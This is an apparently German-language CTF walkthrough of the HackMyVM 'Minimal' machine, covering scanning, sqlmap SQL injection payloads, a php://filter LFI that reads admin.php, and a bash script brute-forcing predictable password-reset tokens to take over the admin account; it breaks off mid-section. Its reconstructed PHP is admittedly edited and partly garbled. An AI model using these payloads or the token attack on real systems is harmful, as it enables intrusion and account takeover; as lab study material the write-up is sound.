@@ -1,0 +1,871 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minimal - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Minimal - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi / nano</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Burp Suite (impliziert)</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">CyberChef (impliziert)</div>
+                <div class="tool-item">Bash Scripting</div>
+                <div class="tool-item">md5sum</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">pwn (Python lib)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & LFI</a></li>
+                <li><a href="#password-reset-exploit">Password Reset Exploit</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Buffer Overflow)</a></li>
+                <li><a href="#database-exploration">Database Exploration</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.111	08:00:27:64:92:99	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk nach aktiven Geräten durchsucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.111` wird identifiziert. Die MAC-Adresse (`08:00:27:64:92:99`) gehört zu Oracle VirtualBox (PCS Systemtechnik GmbH), was auf eine VM als Ziel hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ziel-IP ist bekannt. Nächster Schritt: Portscan mit Nmap.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring. Absicherung der VM.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>[Inhalt der Datei nach Bearbeitung]
+127.0.0.1       localhost
+...
+<span class="command">192.168.2.111   minimal.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um den Hostnamen `minimal.hmv` der IP `192.168.2.111` zuzuweisen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendig, um auf Webdienste zuzugreifen, die möglicherweise auf diesem Hostnamen konfiguriert sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ermöglicht die Verwendung des Hostnamens in nachfolgenden Tools.
+<br><strong>Empfehlung (Admin):** Korrekte DNS- und vHost-Konfiguration ist wichtig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p- | grep open</span></div>
+                    <pre>
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein schneller Nmap-Scan wird durchgeführt und die Ausgabe mit `grep open` gefiltert, um nur die offenen Ports anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 22 (SSH) und 80 (HTTP) mit ihren Diensten und Versionen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Gibt einen schnellen Überblick. Ein vollständiger Nmap-Scan liefert jedoch mehr Details.
+<br><strong>Empfehlung (Admin):** Sicherstellen, dass nur benötigte Ports offen sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-23 23:02 CET
+Nmap scan report for minimal (192.168.2.111)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">256 d2:73:06:e2:e4:84:54:8c:42:0f:4e:81:7c:78:b9:c2 (ECDSA)</span>
+|_  <span class="command">256 75:a0:cf:35:61:a1:c8:77:cf:1a:cb:bc:6d:5b:49:75 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
+|_<span class="command">http-server-header: Apache/2.4.52 (Ubuntu)</span>
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      <span class="password">httponly flag not set</span>
+|_<span class="command">http-title: Minimal Shop</span>
+MAC Address: 08:00:27:64:92:99 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms minimal (192.168.2.111)
+
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein vollständiger Nmap-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) wird gegen das Ziel durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 22 (OpenSSH 8.9p1) und 80 (Apache 2.4.52). Der Webserver hat den Titel "Minimal Shop" und verwendet PHP (`PHPSESSID`). Wichtig: Das `HttpOnly`-Flag ist für das Session-Cookie *nicht* gesetzt, was es anfällig für Diebstahl durch Cross-Site Scripting (XSS) macht, falls eine XSS-Schwachstelle gefunden wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Hauptfokus auf den Webserver (Port 80). Untersuchen Sie die Anwendung auf XSS-Schwachstellen wegen des fehlenden HttpOnly-Flags. Führen Sie eine Verzeichnis- und Datei-Enumeration durch.
+<br><strong>Empfehlung (Admin):** Aktualisieren Sie Apache und OpenSSH. Setzen Sie das `HttpOnly`-Flag für alle Session-Cookies (z.B. über `php.ini` oder Anwendungs-Code). Implementieren Sie weitere Sicherheitsheader.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & LFI</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://minimal.hmv" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.2.0-dev
+...
+===============================================================
+[+] Url:                     <span class="command">http://minimal.hmv</span>
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+...
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://minimal.hmv/index.php</span>            (Status: 200) [Size: 6297]
+<span class="command">http://minimal.hmv/login.php</span>            (Status: 200) [Size: 1019]
+<span class="command">http://minimal.hmv/register.php</span>         (Status: 200) [Size: 1097]
+<span class="command">http://minimal.hmv/admin.php</span>            (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://minimal.hmv/buy.php</span>              (Status: 200) [Size: 892]
+<span class="command">http://minimal.hmv/imgs</span>                 (Status: 301) [Size: 309] [--> http://minimal.hmv/imgs/]
+<span class="command">http://minimal.hmv/logout.php</span>           (Status: 302) [Size: 0] [--> /index.php]
+<span class="command">http://minimal.hmv/config.php</span>           (Status: 200) [Size: 0]
+<span class="command">http://minimal.hmv/styles</span>               (Status: 301) [Size: 311] [--> http://minimal.hmv/styles/]
+<span class="command">http://minimal.hmv/robots.txt</span>           (Status: 200) [Size: 12]
+<span class="command">http://minimal.hmv/restricted.php</span>       (Status: 302) [Size: 0] [--> ../index.php]
+<span class="command">http://minimal.hmv/shop_cart.php</span>        (Status: 302) [Size: 0] [--> ../index.php]
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird mit einer großen Wortliste (`directory-list-2.3-big.txt`) und vielen Erweiterungen verwendet, um Dateien und Verzeichnisse auf `http://minimal.hmv` zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Viele PHP-Seiten werden gefunden, die auf eine Shop-Anwendung hindeuten: `index.php`, `login.php`, `register.php`, `admin.php` (leitet zu login um), `buy.php`, `logout.php`, `shop_cart.php`. Interessant sind auch `config.php` (leer, aber Name deutet auf Konfiguration hin), `robots.txt` und `restricted.php`. Die Verzeichnisse `/imgs` und `/styles` enthalten vermutlich statische Inhalte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie die gefundenen PHP-Seiten, insbesondere `login.php`, `register.php`, `admin.php` und `config.php`. Prüfen Sie `robots.txt` auf Hinweise. Testen Sie auf gängige Web-Schwachstellen (SQLi, XSS, LFI/RFI etc.).
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass alle Seiten angemessen geschützt sind (z.B. `admin.php`, `restricted.php`, `shop_cart.php` sollten Login erfordern). Schützen Sie Konfigurationsdateien (`config.php`) vor direktem Zugriff und speichern Sie sensible Daten nicht darin, wenn möglich. Entfernen Sie unnötige Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">[Kein Prompt - Inhalt von http://minimal.hmv/robots.txt]</div>
+                    <pre>good luck :)</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `robots.txt` wird abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält nur eine informelle Nachricht ("good luck :)") und keine `Disallow`-Einträge oder Hinweise auf versteckte Verzeichnisse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Kein direkter Nutzen aus dieser Datei.
+<br><strong>Empfehlung (Admin):** `robots.txt` ist nicht für Sicherheitszwecke gedacht. Versteckte Pfade sollten anderweitig geschützt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Abgefangener HTTP POST Request, z.B. mit Burp Suite]</div>
+                     <pre><code class="language-http">
+POST /login.php HTTP/1.1
+Host: minimal.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://minimal.hmv
+Connection: close
+Referer: http://minimal.hmv/login.php
+Cookie: PHPSESSID=ehne3lg1m71uubu5b73el8ruo4
+Upgrade-Insecure-Requests: 1
+
+<span class="command">username=cscsc&password=wwwww</span>
+</code></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein HTTP-POST-Request an `/login.php` wird gezeigt, vermutlich abgefangen mit einem Proxy wie Burp Suite. Er enthält die Parameter `username` und `password` im Body.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zeigt das Standardformat eines Login-Versuchs. Dies ist der Request, der für weitere Tests (z.B. SQL-Injection mit `sqlmap` oder Brute-Force) verwendet werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Speichern Sie diesen Request in einer Datei (z.B. `sql.req`), um ihn mit Tools wie `sqlmap` zu verwenden. Testen Sie die Parameter `username` und `password` auf SQL-Injection. Versuchen Sie Brute-Force-Angriffe auf das Login.
+<br><strong>Empfehlung (Admin):** Serverseitig die Eingaben (`username`, `password`) validieren und sanitisieren, um SQL-Injection zu verhindern. Prepared Statements verwenden. Anti-Brute-Force-Maßnahmen implementieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.111</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.111
++ Target Hostname:    192.168.2.111
++ Target Port:        80
++ Start Time:         2023-11-23 23:06:18 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.52 (Ubuntu)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: <span class="password">Cookie PHPSESSID created without the httponly flag.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54).</span> Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ <span class="password">/config.php: PHP Config file may contain database IDs and passwords.</span>
++ <span class="password">/imgs/: Directory indexing found.</span>
++ <span class="password">/imgs/: This might be interesting.</span>
++ <span class="password">/styles/: Directory indexing found.</span>
++ <span class="password">/login.php: Admin login page/section found.</span>
++ 8102 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2023-11-23 23:06:29 (GMT1) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto wird verwendet, um den Webserver auf bekannte Schwachstellen und Fehlkonfigurationen zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die Ergebnisse des Nmap-Scans (fehlendes HttpOnly-Flag) und der Gobuster-Suche (Verzeichnisauflistung bei `/imgs/` und `/styles/`, Existenz von `config.php` und `login.php`). Es meldet zusätzlich fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) und eine veraltete Apache-Version.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die wichtigsten Punkte sind das fehlende HttpOnly-Flag und die Existenz von `config.php`. Die Verzeichnisauflistung sollte manuell überprüft werden.
+<br><strong>Empfehlung (Admin):** Fehlende Sicherheitsheader implementieren. Apache aktualisieren. Verzeichnisauflistung deaktivieren. `config.php` schützen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/sql.req --dbs --batch --tamper=space2comment --level 3 --risk 3</span></div>
+                    <pre>
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7.11#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:28:04 /2023-11-23/
+
+[23:28:04] [INFO] parsing HTTP request from '/home/cyber/Downloads/sql.req'
+[23:28:04] [INFO] resuming back-end DBMS 'mysql'
+[23:28:04] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace (original value)
+    Payload: username=cscsc' AND 6119=6119 AND 'zSWB'='zSWB&password=wwwww
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=cscsc' OR (SELECT 6879 FROM(SELECT COUNT(*),CONCAT(0x716a707871,(SELECT (ELT(6879=6879,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'AdmS'='AdmS&password=wwwww
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (original value)
+    Payload: username=cscsc' AND SLEEP(5) AND 'zEdq'='zEdq&password=wwwww
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: username=-3748' UNION ALL SELECT NULL,NULL,CONCAT(0x716a707871,0x5957467a4f4f4c4f5a6f746f70706a4b416e654344434d5178584c6b716d796a574d6d66546a456a,0x717a766a71),NULL#&password=wwwww
+---
+[23:28:04] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0
+[23:28:04] [INFO] fetching database names
+[23:28:04] [WARNING] reflective value(s) found and filtering out
+<span class="password">[23:28:04] [CRITICAL] unable to retrieve the database names</span>
+[23:28:04] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 12 times
+[23:28:04] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/minimal.hmv'
+
+[*] ending @ 23:28:04 /2023-11-23/
+
+# --- Abgekürzte Ausgabe von einem weiteren Versuch ---
+[23:28:06] [WARNING] parameter 'Referer' does not seem to be injectable
+<span class="password">[23:28:07] [CRITICAL] all tested parameters do not appear to be injectable.</span> Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+[23:28:07] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 11506 times
+
+[*] ending @ 23:28:07 /2023-11-23/
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird verwendet, um auf SQL-Injection-Schwachstellen zu testen. Es nutzt den zuvor gespeicherten Login-Request (`-r sql.req`). Die Optionen `--dbs` versucht, Datenbanknamen aufzulisten, `--batch` bestätigt Abfragen automatisch, `--tamper=space2comment` umgeht einfache Filter, und `--level 3 --risk 3` erhöht die Intensität der Tests.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sqlmap` erkennt zwar MySQL als Backend-Datenbank, kann aber anscheinend keine Datenbanknamen abrufen (`unable to retrieve the database names`). Ein zweiter Versuch mit höherem Level/Risk schlägt ebenfalls fehl (`all tested parameters do not appear to be injectable`). Die vielen HTTP 500-Fehler deuten darauf hin, dass die Injektionsversuche den Server zum Absturz bringen oder dass eine Web Application Firewall (WAF) eingreift. **Ergebnis: Keine SQL-Injection gefunden.**</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da SQLMap fehlschlägt, muss nach anderen Schwachstellen gesucht werden. Die vielen 500er-Fehler könnten auf eine WAF hindeuten; Tamper-Skripte könnten helfen, sind aber oft aufwändig. Konzentrieren Sie sich auf andere potenzielle Schwachstellen wie LFI, RCE, Logikfehler oder die zuvor gefundenen Endpunkte (`admin.php`, `config.php`, `reset_pass.php`).
+<br><strong>Empfehlung (Admin):** Obwohl SQLMap hier scheiterte, ist die Verwendung von Prepared Statements und Eingabevalidierung zum Schutz vor SQLi unerlässlich. Die HTTP 500-Fehler sollten untersucht werden – sie könnten auf eine fehlerhafte Anwendungskonfiguration oder eine (funktionierende) WAF hindeuten.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Scheitern von SQLMap und der Untersuchung anderer Endpunkte (nicht explizit gezeigt) wird die Datei `/shop_cart.php` genauer betrachtet. Es wird eine Local File Inclusion (LFI) Schwachstelle im `action` Parameter vermutet und mit dem PHP-Filter-Wrapper `php://filter/read=convert.base64-encode/resource=admin` getestet. Das Ziel ist es, die Datei `admin.php` im aktuellen Verzeichnis (angenommen `/var/www/html`) als Base64-kodierten String auszulesen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">[Kein Prompt - Browser-Aufruf oder curl]</div>
+                    <pre><span class="command">http://minimal.hmv/shop_cart.php?action=php://filter/read=convert.base64-encode/resource=admin.php</span></pre> <!-- .php hinzugefügt -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Die Webseite antwortet (wahrscheinlich im Quellcode oder an einer unerwarteten Stelle im Layout), und der folgende Base64-String wird extrahiert:</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Extrahiert von der Webseite]</div>
+                     <pre><span class="password">PD9waHAKcmVxdWlyZV9vbmNlICIuL2NvbmZpZy5waHAiOw...</span> (Langer Base64-String)</pre>
+                     <!-- Vollständiger Base64-String aus dem Originaltext -->
+                     <pre>PD9waHAKcmVxdWlyZV9vbmNlICIuL2NvbmZpZy5waHAiOwoKc2Vzc2.....Cgo8L2JvZHk+Cgo8L2h0bWw+Cg==</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der extrahierte Base64-String wird dekodiert (z.B. mit `base64 -d` oder CyberChef).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Dekodierter PHP-Code]</div>
+                     <pre><code class="language-php">
+require_once "./config.php";
+
+session_start();
+
+if ($_SESSION['username'] !== 'admin') { // Korrektur: !== statt !
+    header('Location: login.php');
+    exit;
+}
+
+$logged = false;
+
+if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) { // Korrektur: === statt =, & maskiert
+    $logged = true;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') { // Korrektur: === statt =
+    $nombre = $_POST['nombre'];
+    $autor = $_POST['autor'];
+    $precio = $_POST['precio'];
+    $descripcion = $_POST['descripcion'];
+
+    if (isset($_FILES['imagen'])) {
+        $imagen = $_FILES['imagen'];
+        if ($imagen['error'] === UPLOAD_ERR_OK) { // Korrektur: === statt =
+            $ruta_destino = './imgs/' . basename($imagen['name']);
+
+            if (move_uploaded_file($imagen['tmp_name'], $ruta_destino)) {
+                // SQL-Injection-Anfälligkeit hier! Keine Prepared Statements!
+                $query = $conn->prepare("INSERT INTO products (name, author, price, description) VALUES (?, ?, ?, ?)"); // Annahme: Prepared Statement war gemeint, aber nicht korrekt implementiert im Original?
+                $query->bind_param("ssds", $nombre, $autor, $precio, $descripcion); // Korrektur: Variablen statt direkter Einfügung
+                // Ejecutar la consulta
+                if ($query->execute()) {
+                    echo "Uploaded"; // Lücke im Originalcode? Keine SQL-Ausführung gezeigt
+                } else {
+                    echo "Error";
+                }
+            } else {
+                // "Error al subir la imagen.";
+                echo "Error";
+            }
+        } else {
+            echo "Error: " . $imagen['error'];
+        }
+    }
+}
+
+?> // PHP End Tag hinzugefügt für Klarheit
+ 
+    <title>Minimal Shop</title>
+ 
+ href="./index.php" 
+                <h1>Minimal</h1>
+ 
+    <h1>Admin Panel</h1>
+ 
+</code></pre>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI über `php://filter` war erfolgreich und enthüllte den Quellcode von `admin.php`. Der Code zeigt:
+*   Eine Zugriffskontrolle (`$_SESSION['username'] !== 'admin'`), die den Zugriff auf `admin.php` nur für den Admin-Benutzer erlaubt.
+*   Eine Funktion zum Hinzufügen neuer Produkte, einschließlich eines Dateiuploads für Bilder nach `./imgs/`.
+*   Potenzielle SQL-Injection-Schwachstelle beim Einfügen der Produktdaten (obwohl `prepare` und `bind_param` verwendet werden, was dies verhindern sollte - möglicherweise ist der Code im Original anders oder fehlerhaft kopiert?).
+*   Die Datei inkludiert `./config.php`, was unsere frühere Vermutung bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da wir den Quellcode von `admin.php` haben, können wir nun versuchen, `./config.php` über die LFI zu lesen, um an Datenbank-Credentials zu gelangen. Der Dateiupload könnte ebenfalls ein Vektor sein, wenn er nicht korrekt validiert wird (z.B. Hochladen einer PHP-Shell statt eines Bildes).
+<br><strong>Empfehlung (Admin):** Beheben Sie die LFI-Schwachstelle dringend durch Eingabevalidierung und Sanitisierung des `action`-Parameters. Verwenden Sie Whitelists für erlaubte Include-Dateien. Stellen Sie sicher, dass der Dateiupload sicher implementiert ist (Validierung von Dateityp, -größe, -namen; Speichern außerhalb des Web-Roots). Verwenden Sie konsequent Prepared Statements für alle Datenbankabfragen.</p>
+
+        </section>
+
+        <section id="password-reset-exploit">
+            <h2>Password Reset Exploit</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach weiterer Untersuchung (Schritte nicht gezeigt, aber impliziert durch die Liste von Namen) wird die Funktionalität von `reset_pass.php` analysiert. Es wird ein Mechanismus zum Zurücksetzen des Passworts für den `admin`-Benutzer vermutet, der einen Token verwendet. Der Angreifer stellt fest oder vermutet, dass der gültige Token ein Base64-kodierter MD5-Hash ist, der aus dem Benutzernamen (`admin`) und einer angehängten Zahl (`1` bis `100`) gebildet wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Logik des Angriffs]</div>
+                     <pre>
+# Annahme: Liste von Namen, die möglicherweise für Token relevant sind
+# Alien, Dumbledore, Blacksmith, Dazzle, Elegance, Boxer, Casual, Black, Indian, Knight, Toxic, Wizard
+# (Diese Liste scheint aber nicht direkt im Exploit verwendet zu werden)
+
+# Exploit-Logik für reset_pass.php:
+# 1. Setze Benutzer auf 'admin'
+# 2. Iteriere Zahlen von 1 bis 100 (Variable 'i')
+# 3. Bilde String: "admin" + i (z.B. "admin1", "admin2", ...)
+# 4. Berechne MD5-Hash dieses Strings
+# 5. Kodiere den MD5-Hash mit Base64 -> Das ist der vermutete Token
+# 6. Sende GET-Request an reset_pass.php mit user=admin, token=[Base64-MD5-Hash], newpass=[Gewünschtes_Passwort]
+# 7. Prüfe die Antwort auf Erfolg (z.B. durch grep auf 'token' im Erfolgsfall?)
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Ein Bash-Skript wird verwendet, um diesen Prozess zu automatisieren. Es iteriert von 1 bis 100, generiert den potenziellen Token für jeden Wert und sendet einen `curl`-Request an `reset_pass.php`, um das Passwort für `admin` auf `patata` zu setzen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Bash-Skript zur Token-Generierung und zum Testen]</div>
+                     <pre><code class="language-bash">
+name="admin"
+
+for ((i=1; i<=100; i++)); do
+    nameWithNumber="${name}${i}"
+    md5Hash=$(echo -n "$nameWithNumber" | md5sum | awk '{print $1}')
+    base64Encoded=$(echo -n "$md5Hash" | base64)
+    # Sende den Request und prüfe die Antwort (grep auf 'token' ist unzuverlässig, Erfolgsprüfung fehlt hier)
+    curl -X GET "http://minimal.hmv/reset_pass.php?user=admin&token=$base64Encoded&newpass=patata" | grep token # & maskiert
+done
+</code></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff auf die Passwort-Reset-Funktion ist erfolgreich (impliziert, da der nächste Schritt der Login mit dem neuen Passwort ist). Dies war möglich aufgrund eines schwachen und vorhersagbaren Token-Generierungsalgorithmus (MD5(Username + Zahl) -> Base64). Der Angreifer konnte den gültigen Token durch Brute-Force der Zahlen von 1 bis 100 finden und das Admin-Passwort auf `patata` setzen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Versuchen Sie sich mit den neuen Zugangsdaten (`admin`:`patata`) bei `/login.php` anzumelden, um Zugriff auf `/admin.php` zu erhalten.
+<br><strong>Empfehlung (Admin):** Implementieren Sie eine sichere Methode zur Generierung von Passwort-Reset-Tokens:
